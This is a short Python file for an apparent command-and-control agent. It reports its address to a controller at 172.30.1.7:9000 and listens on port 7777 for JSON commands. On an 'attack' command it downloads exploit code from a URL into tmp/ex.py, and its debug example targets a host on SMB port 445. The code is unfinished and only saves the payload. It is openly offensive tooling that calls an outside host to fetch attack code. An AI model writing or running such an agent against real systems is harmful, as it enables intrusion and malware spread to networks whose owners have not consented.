import requests
from network import utility
import json

class Agent(object):
    def __init__(self):
        self.ip = utility.get_local_ip()
        self.port = 7777

    def run(self):
        s = utility.open_server(self.ip, self.port)
        c, _ = s.accept()
        cmd = utility.recv_with_size(c)
        cmd = json.loads(cmd)
        controller = CommandProcessor(cmd)
        pass

    def debug(self):
        controller = CommandProcessor({
                "type": "attack",
                "download": "http://127.0.0.1:9000/exploit/1",
                "target_ip": "172.30.1.2",
                "port": 445,
        })

class CommandProcessor(object):
    def __init__(self, cmd):
        if "type" not in cmd:
            print("type missing")
            exit(1)
        
        if cmd["type"] == "attack":
            link = cmd['download']
            r = requests.get(link)
            with open("tmp/ex.py", "w") as f:
                f.write(r.text)

if __name__ == '__main__':
    HOST = "http://172.30.1.7:9000"
    A = Agent()
    
    ip_info = { "agent": {"ip": A.ip, "port": A.port } }
    res = requests.post(HOST, json = ip_info)
    
    A.debug()